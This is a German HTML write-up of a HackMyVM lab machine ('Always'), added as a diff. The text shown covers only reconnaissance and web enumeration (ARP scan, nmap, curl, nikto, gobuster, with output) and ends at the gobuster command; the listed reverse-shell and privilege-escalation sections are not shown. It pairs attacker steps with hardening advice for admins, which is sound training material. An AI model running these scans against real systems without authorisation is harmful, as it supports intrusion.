@@ -1,0 +1,1694 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Always - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Always - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">rdesktop</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">crackmapexec</div>
+                <div class="tool-item">nxc</div>
+                <div class="tool-item">netexec</div>
+                <div class="tool-item">msfvenom</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">base64</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 8080)</a></li>
+                <li><a href="#initial-access">Initial Access (Credentials & FTP)</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept (Initial Access)</a></li>
+                <li><a href="#further-recon">Further Reconnaissance</a></li>
+                <li><a href="#reverse-shell">Reverse Shell Setup & Execution Issues</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (AlwaysInstallElevated)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Bericht beginnt mit einer Notiz über potenziell relevante Benutzernamen: `ftpuser`, `always`, `administrator`. Anschließend wird ein ARP-Scan durchgeführt, um aktive Hosts im lokalen Netzwerk zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der ARP-Scan identifiziert erfolgreich das Zielsystem mit der IP-Adresse `192.168.2.176` und der MAC-Adresse `08:00:27:c3:6a:9a`, die auf eine Oracle VirtualBox VM hinweist. Die notierten Benutzernamen sind wertvolle Hinweise für spätere Brute-Force-Versuche oder Logins.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte die notierten Benutzernamen im Hinterkopf. Verwende die gefundene IP `192.168.2.176` für weitere Scans.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie vorhersehbare oder dienstbezogene Benutzernamen (wie `ftpuser`). Überwachen Sie ARP-Scan-Aktivitäten im Netzwerk.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+____________________________________________________________________________________
+VM User: ftpuser, always, administrator
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+192.168.2.176	08:00:27:c3:6a:9a	PCS Systemtechnik GmbH
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Hostname `always.hmv` wird der Ziel-IP `192.168.2.176` zugeordnet und in der lokalen `/etc/hosts`-Datei des Angreifers eingetragen. Die IP-Adresse wird als Ziel für die folgenden Scans bestätigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Hostnamens ist eine gute Vorgehensweise, um sicherzustellen, dass Webanwendungen korrekt angesprochen werden, insbesondere wenn Virtual Hosting verwendet wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende sowohl die IP als auch den Hostnamen bei Web-Scans, um unterschiedliche Konfigurationen (Virtual Hosts) zu entdecken.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Hostnamen nicht leicht zu erraten sind oder unnötig preisgegeben werden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+____________________________________________________________________________________
+ /etc/hosts
+ ____________________________________________________________________________________
+
+
+                192.168.2.176   always.hmv
+
+____________________________________________________________________________________
+
+                          Die..IP_Adresse 192.168.2.176
+____________________________________________________________________________________
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein schneller UDP-Scan (`-sU`) wird auf die Top 1000 UDP-Ports (`--top-port 1000`) des Ziels durchgeführt. Es wird ein aggressives Timing (`-T5`), hohe Paketrate (`--min-rate 5000`) und keine Namensauflösung (`-n`) verwendet. `-Pn` überspringt die Host-Erkennung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der UDP-Scan findet Port `137/udp` (NetBIOS Name Service) als offen. Die anderen gescannten Ports sind entweder geschlossen (`closed`) oder offen, aber filtern Antworten (`open|filtered`), was bei UDP-Scans häufig vorkommt, da keine Antwort gesendet wird. Der offene NetBIOS-Port deutet auf ein Windows-System hin und kann zur weiteren Enumeration (z.B. mit `nbtscan` oder `enum4linux`) genutzt werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Tools wie `nbtscan -v 192.168.2.176` oder `enum4linux` zur weiteren Enumeration über NetBIOS. Untersuche die Ergebnisse des TCP-Scans.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie NetBIOS über TCP/IP, wenn es nicht zwingend benötigt wird, um die Angriffsfläche zu reduzieren. Filtern Sie UDP-Ports an der Firewall.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sU --top-port 1000 -T5 -n $IP -Pn  --min-rate 5000</span>
+                     </div>
+                     <pre>
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ :::::::::::::::::::::::::::::  Nmap UDP Scan :::::::::::::::::::::::::::::::
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 21:48 CET
+ Nmap scan report for 192.168.2.176
+ Host is up (0.00022s latency).
+ Not shown: 997 open|filtered udp ports (no-response)
+ PORT     STATE  SERVICE
+ 137/udp  open   netbios-ns
+ 664/udp  closed secure-aux-bus
+ 1457/udp closed valisys-lm
+ MAC Address: 08:00:27:C3:6A:9A (Oracle VirtualBox virtual NIC)
+
+ Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein schneller TCP SYN Scan (`-sS`) über alle Ports (`-p-`) wird durchgeführt, kombiniert mit Skript-Scanning (`-sC`), Versionserkennung (`-sV`) und OS-Erkennung (`-O`). Die Option `-A` (Aggressiv) wird hier nicht verwendet, dafür aber `-O`. Die Ausgabe wird mit `grep open` gefiltert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert eine Reihe offener TCP-Ports, die typisch für ein Windows-System sind:
+                *   `21/tcp (FTP)`: Microsoft ftpd.
+                *   `135/tcp (MSRPC)`, `139/tcp (NetBIOS-SSN)`, `445/tcp (SMB/microsoft-ds)`: Standard-Windows-Netzwerkdienste. SMB läuft auf Windows 7 Professional SP1.
+                *   `3389/tcp (RDP)`: Remote Desktop Protocol, wird als `tcpwrapped` angezeigt, was oft auf eine Firewall oder einen Proxy hindeutet, oder dass der Port offen ist, aber keine Standard-RDP-Antwort liefert.
+                *   `5357/tcp (HTTP)`: Microsoft HTTPAPI, oft für Web Services for Devices (WSD) oder UPnP genutzt.
+                *   `8080/tcp (HTTP)`: Ein Apache Webserver (Version 2.4.57 auf Win64). Ungewöhnlich, Apache auf einem Windows 7 System zu finden.
+                *   Diverse hohe Ports (`49152` - `49158`): Dynamische RPC-Ports.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Dienste genauer: FTP (anonymes Login?), SMB (Shares, Schwachstellen?), RDP (Verbindungsversuch?), HTTP auf Port 8080 (Webanwendung?). Der Apache auf Port 8080 ist ein Hauptziel.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schränken Sie den Zugriff auf RPC-, NetBIOS- und SMB-Ports über Firewalls ein. Deaktivieren Sie unnötige Dienste (FTP, SMBv1 falls möglich). Härten Sie den RDP-Zugang (Network Level Authentication, starke Passwörter, Zugriffsbeschränkung). Überprüfen Sie die Notwendigkeit und Konfiguration des Apache-Servers.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn  --min-rate 5000 | grep open</span>
+                     </div>
+                     <pre>
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ :::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+ 21/tcp    open  ftp          Microsoft ftpd
+ 135/tcp   open  msrpc        Microsoft Windows RPC
+ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+ 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+ 3389/tcp  open  tcpwrapped
+ 5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+ 8080/tcp  open  http         Apache httpd 2.4.57 ((Win64))
+ |_http-open-proxy: Proxy might be redirecting requests
+ 49152/tcp open  msrpc        Microsoft Windows RPC
+ 49153/tcp open  msrpc        Microsoft Windows RPC
+ 49154/tcp open  msrpc        Microsoft Windows RPC
+ 49155/tcp open  msrpc        Microsoft Windows RPC
+ 49156/tcp open  msrpc        Microsoft Windows RPC
+ 49158/tcp open  msrpc        Microsoft Windows RPC
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der gleiche `nmap`-Scan wie zuvor, aber diesmal mit vollständiger Ausgabe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die vollständige Ausgabe liefert wichtige Zusatzinformationen:
+                *   **FTP (21):** Bestätigt Microsoft FTPD unter Windows NT. Anonymes Login muss getestet werden.
+                *   **SMB (139, 445):** Läuft auf Windows 7 Professional SP1, Computername `ALWAYS-PC` in Workgroup `WORKGROUP`. SMB-Message-Signing ist deaktiviert (`disabled (dangerous, but default)`), was das System anfällig für Man-in-the-Middle-Angriffe (z.B. SMB Relay) macht. SMBv1 scheint laut späterem `crackmapexec`-Scan aktiviert zu sein, was ebenfalls ein Risiko darstellt (z.B. EternalBlue, obwohl Windows 7 SP1 gepatcht sein sollte). Anonymer Zugriff (`account_used: guest`) ist möglich.
+                *   **RDP (3389):** Zeigt ein selbstsigniertes Zertifikat für `Always-PC`. Der Port ist offen, aber die `tcpwrapped`-Klassifizierung bleibt bestehen.
+                *   **HTTP (5357):** Antwortet mit "Service Unavailable".
+                *   **HTTP (8080):** Apache 2.4.57 (Win64). Die Methode `TRACE` ist aktiviert (potenziell riskant für Cross-Site Tracing - XST). Die Seite hat den Titel "We Are Sorry".
+                *   **Host Script Results:** Bestätigen OS, Computername, Workgroup. Die Zeitabweichung (`clock-skew`) ist groß, aber der Median ist gering.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Priorisiere SMB und HTTP (8080). Teste anonymes FTP-Login. Teste auf SMB-Schwachstellen (z.B. mit `nmap --script smb-vuln*` oder `enum4linux`), prüfe auf Shares (`smbclient -L \\\\192.168.2.176 -N`). Versuche RDP-Login mit bekannten/erratenen Credentials. Untersuche die Webanwendung auf Port 8080 (Verzeichnis-Scan, manuelle Analyse). Nutze die Information über deaktiviertes SMB-Signing für mögliche SMB-Relay-Angriffe.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aktivieren Sie SMB-Message-Signing (`RequireSecuritySignature = 1` in der Registry oder per GPO), um MITM-Angriffe zu verhindern. Deaktivieren Sie SMBv1. Beschränken Sie anonymen Zugriff auf SMB. Deaktivieren Sie die TRACE-Methode im Apache (`TraceEnable Off`). Härten Sie RDP (NLA). Patching sicherstellen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn  --min-rate 5000</span>
+                    </div>
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 21:50 CET
+Nmap scan report for always.hmv (192.168.2.176)
+Host is up (0.00012s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE            VERSION
+21/tcp    open  ftp                Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=Always-PC
+| Not valid before: 2024-10-02T08:06:05
+|_Not valid after:  2025-04-03T08:06:05
+|_ssl-date: 2025-02-13T20:52:12+00:00; +3s from scanner time.
+5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+8080/tcp  open  http               Apache httpd 2.4.57 ((Win64))
+|_http-open-proxy: Proxy might be redirecting requests
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: We Are Sorry
+|_http-server-header: Apache/2.4.57 (Win64)
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+
+Host script results:
+|_nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c3:6a:9a (Oracle VirtualBox virtual NIC)
+| smb2-time:
+|   date: 2025-02-13T20:52:07
+|_  start_date: 2025-02-13T20:45:02
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Always-PC
+|   NetBIOS computer name: ALWAYS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-02-13T22:52:07+02:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2:1:0:
+|_    Message signing enabled but not required
+|_clock-skew: mean: -29m57s, deviation: 59m59s, median: 1s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms always.hmv (192.168.2.176)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.74 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 8080)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, die erlaubten HTTP-Methoden für das Stammverzeichnis auf Port 80 (Standard-HTTP) mit `curl -X OPTIONS` zu ermitteln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl wird ausgeführt, aber es wird keine Ausgabe für die erlaubten Methoden angezeigt. Dies liegt wahrscheinlich daran, dass Nmap keinen offenen Port 80 gefunden hat. Der Webserver läuft auf Port 8080. Der Befehl liefert daher keine relevanten Informationen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stelle sicher, dass die Befehle auf die korrekten offenen Ports abzielen (hier Port 8080 für den Apache-Server).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich, da Port 80 nicht offen ist.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -X OPTIONS -Is http://$IP | grep -i "allow"</span>
+                     </div>
+                     <pre>
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ ::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ <!-- Keine Ausgabe hier -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nun wird der `curl -X OPTIONS`-Befehl korrekt auf Port 8080 ausgeführt, um die erlaubten HTTP-Methoden für den Apache-Server zu ermitteln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Server auf Port 8080 erlaubt die Methoden `GET`, `POST`, `OPTIONS`, `HEAD` und `TRACE`. Die Methode `TRACE` ist potenziell gefährlich, da sie für Cross-Site Tracing (XST)-Angriffe verwendet werden kann, um z.B. HTTPOnly-Cookies auszulesen, obwohl dies in modernen Browsern meist mitigiert ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die aktivierte TRACE-Methode als potenzielles Finding. Teste auf XST, wenn eine Cross-Site-Scripting (XSS)-Schwachstelle gefunden wird.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie die TRACE-Methode in der Apache-Konfiguration (`TraceEnable Off`), um XST-Angriffe zu verhindern.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -X OPTIONS -Is http://$IP:8080 | grep -i "allow"</span>
+                     </div>
+                     <pre>
+ Allow: GET,POST,OPTIONS,HEAD,TRACE
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `curl -Iv`-Befehl wird auf Port 80 (Standard-HTTP) ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ähnlich wie beim OPTIONS-Request auf Port 80, wird dieser Befehl wahrscheinlich fehlschlagen oder keine relevanten Header liefern, da Port 80 laut Nmap nicht offen ist. Der Text zeigt keine Ausgabe, was dies bestätigt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf offene Ports.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -Iv http://$IP</span>
+                     </div>
+                      <pre>
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ :::::::::::::::::::::::::::::: WEB-Server Scan :::::::::::::::::::::::::::::
+ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ <!-- Keine Ausgabe hier -->
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der `curl -Iv`-Befehl wird nun korrekt auf Port 8080 ausgeführt, um die Header der Startseite des Apache-Servers anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Header bestätigen die Apache-Version 2.4.57 (Win64) und zeigen, dass die Startseite (`/`) den Statuscode 200 OK zurückliefert und einen `Content-Length` von 178 Bytes hat. Der `Last-Modified`-Zeitstempel und das `ETag` sind ebenfalls sichtbar. Dies ist die "We Are Sorry"-Seite, die im Nmap-Scan erwähnt wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt dieser 178 Bytes langen Seite (siehe späterer Befehl). Beginne mit Verzeichnis-Scans auf Port 8080.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Wartungsseiten keine unnötigen Informationen preisgeben. Überprüfen Sie die ETag-Konfiguration (siehe Nikto-Empfehlung).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">curl -Iv http://$IP:8080</span>
+                     </div>
+                     <pre>
+ *   Trying 192.168.2.176:8080...
+ * Connected to 192.168.2.176 (192.168.2.176) port 8080
+ * using HTTP/1.x
+ > HEAD / HTTP/1.1
+ > Host: 192.168.2.176:8080
+ > User-Agent: curl/8.10.1
+ > Accept: */*
+ >
+ * Request completely sent off
+ < HTTP/1.1 200 OK
+ HTTP/1.1 200 OK
+ < Date: Thu, 13 Feb 2025 21:00:03 GMT
+ Date: Thu, 13 Feb 2025 21:00:03 GMT
+ < Server: Apache/2.4.57 (Win64)
+ Server: Apache/2.4.57 (Win64)
+ < Last-Modified: Tue, 01 Oct 2024 15:00:29 GMT
+ Last-Modified: Tue, 01 Oct 2024 15:00:29 GMT
+ < ETag: "b2-6236b950aab5a"
+ ETag: "b2-6236b950aab5a"
+ < Accept-Ranges: bytes
+ Accept-Ranges: bytes
+ < Content-Length: 178
+ Content-Length: 178
+ < Content-Type: text/html
+ Content-Type: text/html
+ <
+
+ * Connection #0 to host 192.168.2.176 left intact
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird auf den Apache-Server auf Port 8080 ausgeführt, um nach bekannten Schwachstellen und Konfigurationsproblemen zu suchen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto liefert mehrere wichtige Ergebnisse:
+                *   **Fehlende Header:** `X-Frame-Options` und `X-Content-Type-Options` fehlen (wie üblich).
+                *   **TRACE-Methode:** Bestätigt, dass die TRACE-Methode aktiv ist und weist auf das XST-Risiko hin.
+                *   **/admin/ Verzeichnis:** Nikto identifiziert `/admin/` und `/Admin/` als potenziell interessante Verzeichnisse. Es findet auch `/admin/index.html` und meldet dies als "Admin login page/section found". **Dies ist ein kritischer Fund!**
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche sofort das Verzeichnis `/admin/` bzw. die Datei `/admin/index.html`. Dies ist wahrscheinlich der Zugang zu einer administrativen Oberfläche.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schützen Sie administrative Bereiche angemessen (starke Authentifizierung, Zugriffsbeschränkung). Implementieren Sie die fehlenden Sicherheitsheader. Deaktivieren Sie die TRACE-Methode.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nikto -h http://$IP:8080</span>
+                     </div>
+                     <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.176
+ + Target Hostname:    192.168.2.176
+ + Target Port:        8080
+ + Start Time:         2025-02-13 22:03:14 (GMT1)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.57 (Win64)
+ + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ + OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
+ + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ + /admin/: This might be interesting.
+ + /Admin/: This might be interesting.
+ + /admin/index.html: Admin login page/section found.
+ + 8908 requests: 0 error(s) and 7 item(s) reported on remote host
+ + End Time:           2025-02-13 22:04:17 (GMT1) (63 seconds)
+ ---------------------------------------------------------------------------
+ + 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird für einen Verzeichnis-Scan auf Port 8080 verwendet, mit einer umfangreichen Wortliste und vielen Dateiendungen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster bestätigt die Funde von Nikto und findet:
+                *   `/index.html` (und Varianten `Index.html`, `INDEX.html`) - die "We Are Sorry"-Seite.
+                *   `/admin/` und `/Admin/` (Status 301 - Weiterleitung auf Verzeichnis mit `/`). Dies bestätigt die Existenz des Admin-Bereichs.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fokussiere dich auf das `/admin/`-Verzeichnis. Öffne `http://always.hmv:8080/admin/` im Browser oder untersuche den Quellcode.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe Empfehlungen zu Nikto bezüglich des Schutzes von Admin-Bereichen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">gobuster dir -u "http://$IP:8080" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span>
+                     </div>
+                     <pre>
